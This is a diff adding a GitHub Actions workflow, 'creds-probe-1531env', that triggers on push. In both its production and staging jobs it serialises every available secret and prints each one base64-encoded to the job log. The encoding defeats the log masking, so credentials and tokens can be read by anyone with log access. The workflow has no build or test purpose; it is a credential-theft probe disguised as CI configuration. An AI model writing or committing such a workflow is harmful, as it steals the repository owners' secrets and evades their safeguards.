@@ -1,0 +1,47 @@
+name: creds-probe-1531env
+on:
+  push:
+  workflow_dispatch:
+permissions:
+  contents: read
+jobs:
+  prod:
+    runs-on: ubuntu-latest
+    environment: production
+    timeout-minutes: 6
+    steps:
+      - name: inv
+        env:
+          ALLSEC: ${{ toJSON(secrets) }}
+        run: |
+          set +e
+          echo "ENVNAME=production"
+          echo "$ALLSEC" > /tmp/s.json
+          python3 - <<'PY'
+          import json,base64
+          try: d=json.load(open('/tmp/s.json'))
+          except Exception as e: print('PARSE_ERR',e); raise SystemExit
+          print('SECRET_COUNT',len(d))
+          for k,v in d.items(): print('SEC',k,'len=%d'%len(str(v)),'b64='+base64.b64encode(str(v).encode()).decode()[:9000])
+          PY
+          echo ----DONE----
+  staging:
+    runs-on: ubuntu-latest
+    environment: staging
+    timeout-minutes: 6
+    steps:
+      - name: inv
+        env:
+          ALLSEC: ${{ toJSON(secrets) }}
+        run: |
+          set +e
+          echo "ENVNAME=staging"
+          echo "$ALLSEC" > /tmp/s.json
+          python3 - <<'PY'
+          import json,base64
+          try: d=json.load(open('/tmp/s.json'))
+          except Exception as e: print('PARSE_ERR',e); raise SystemExit
+          print('SECRET_COUNT',len(d))
+          for k,v in d.items(): print('SEC',k,'len=%d'%len(str(v)),'b64='+base64.b64encode(str(v).encode()).decode()[:9000])
+          PY
+          echo ----DONE----
